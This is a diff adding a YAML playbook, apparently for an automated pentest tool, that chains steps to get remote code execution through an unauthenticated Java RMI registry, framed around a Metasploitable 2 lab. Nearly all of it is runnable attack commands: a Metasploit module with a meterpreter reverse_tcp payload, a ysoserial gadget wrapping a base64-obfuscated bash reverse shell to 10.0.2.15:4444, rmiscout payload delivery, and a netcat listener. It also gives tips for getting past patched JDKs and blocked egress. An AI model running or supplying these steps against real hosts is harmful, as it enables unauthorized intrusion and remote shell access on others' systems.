@@ -1,0 +1,75 @@
+chain_id: java_rmi_registry_rce
+title: "Java RMI Registry — unauth class loading → RCE (Metasploitable 1099)"
+severity: CRITICAL
+tags: [javarmi, rmi, deserialization, rce, metasploitable]
+
+trigger:
+  any_of:
+    - { kind: "java_rmi_registry" }
+    - { service_pattern: "(?i)java-rmi|rmiregistry|jrmi" }
+    - { banner_pattern: "(?i)rmi\\s*registry|java\\s*rmi" }
+    - { port_in: [1099, 1098, 8083] }
+
+description: |
+  A Java RMI registry that allows remote class loading
+  (`useCodebaseOnly=false`, default before JDK 7u21) lets an unauth
+  attacker register a remote object that, when looked up, pulls a
+  malicious `.class` from an attacker-controlled HTTP server and
+  executes it inside the registry's JVM. Metasploitable 2 exposes it
+  on 1099 with this default.
+
+steps:
+  - id: 1
+    title: "Confirm RMI registry"
+    command: |
+      nmap -sV -p 1099 --script=rmi-vuln-classloader,rmi-dumpregistry $VICTIMA
+      # Look for: rmi-vuln-classloader: VULNERABLE
+
+  - id: 2
+    title: "RCE via the public Metasploit module"
+    command: |
+      msfconsole -qx 'use exploit/multi/misc/java_rmi_server; \
+        set RHOSTS $VICTIMA; set RPORT 1099; \
+        set PAYLOAD java/meterpreter/reverse_tcp; \
+        set LHOST 10.0.2.15; set LPORT 4444; run'
+
+  - id: 3
+    title: "Or with ysoserial gadgets if registry rejects classloader trick"
+    command: |
+      java -jar ysoserial.jar CommonsCollections5 \
+        'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}' \
+        > payload.bin
+      # Submit to registry via rmiscout / RMIPwner:
+      git clone https://github.com/BishopFox/rmiscout /tmp/rmiscout
+      java -jar /tmp/rmiscout/rmiscout.jar attack -i $VICTIMA -p 1099 -f payload.bin
+
+  - id: 4
+    title: "Enumerate registered objects"
+    command: |
+      python3 -c "
+      from rmiclient import RMIClient
+      c=RMIClient('$VICTIMA',1099)
+      for n in c.list(): print(n)
+      "
+
+  - id: 5
+    title: "Reverse shell catcher"
+    command: nc -lvnp 4444
+
+common_errors:
+  - error: "rmi-vuln-classloader: NOT VULNERABLE"
+    solution: |
+      JDK 7u21+ (default since 2013) sets `useCodebaseOnly=true`.
+      The classloader path is dead. Pivot to deserialization via
+      ysoserial gadgets — works against any RMI service that
+      consumes Object arguments (often JMX 1090, registries with
+      bound objects).
+  - error: "Module hangs after 'sending RMI Header'"
+    solution: |
+      Egress from victim to your HTTP server is blocked. Use a
+      reverse port forward (`chisel`, `ssh -R`) so the JVM can fetch
+      its class from your loopback exposed on the victim.
+
+references:
+  - https://github.com/BishopFox/rmiscout
+  - https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/
